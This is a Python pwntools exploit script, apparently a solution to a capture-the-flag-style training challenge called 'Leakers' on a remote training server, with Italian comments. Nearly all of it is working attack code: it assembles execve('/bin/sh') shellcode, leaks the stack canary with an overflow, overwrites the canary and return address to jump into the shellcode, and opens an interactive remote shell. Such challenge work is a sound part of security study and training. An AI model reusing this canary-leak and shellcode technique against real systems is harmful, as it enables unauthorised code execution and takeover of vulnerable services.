#! /usr/bin/python3
import sys
import pwn
import time
import copy


#pwn.context.log_level='DEBUG'

# per runnare il processo in virtual machine e interagirci da fuori:
# ssh= ssh("username","ip")
# r= ssh.process("./multistage")                    multistage name of the process

pwn.context.terminal = ['tmux', 'split-window', '-h'] #(si può usare screen)
#r = pwn.process("./leakers")
#pwn.gdb.attach(r, '''
#b * 0x004011d7
#b * 0x00401205
#b * 0x00401223
#b * 0x00401316
#c
#''' )

shellcode1= '''
xor rdi,rdi
mov rdi,0x00000000004040a0
add rdi,0x56
mov rax,0x3b
xor rsi,rsi
xor rdx,rdx
syscall
'''
pwn.context.arch="amd64"
shellcode=pwn.asm(shellcode1)
#print(len(shellcode))
r=pwn.remote("bin.training.offdef.it",2010)
exploit=(100-len(shellcode)-15)*b'\x90'+shellcode+b'////////bin/sh/'
r.sendafter("Welcome to Leakers!\n\n",exploit)
input("wait")
r.send(105*b'A')
r.recvuntil("> ")
out=r.recv()
canary=out[105:112]
r.send(104*b'A'+b'\x00'+canary+b'\x01\x00\x00\x00\x00\x00\x00\x00'+b'\xa0\x40\x40\x00\x00\x00\x00\x00')
input("wait")
r.send(b'\x00')
r.interactive()

##r.send(pwn.asm(shellcode2)+b'')
#a=r.recv()
#for byte in a:
#    print(hex(byte), end=' ')
#r.send()
#r.send(len(fragment1)*b'\x90'+pwn.asm(shellcode2)+payload)
#r.interactive()

#sys.stdout.buffer.write(shellcode+(20-len(shellcode))*b'\x41'+payload+pwn.asm(shellcode2))
#input("wait")
#sys.stdout.buffer.write(payload+pwn.asm(shellcode2))
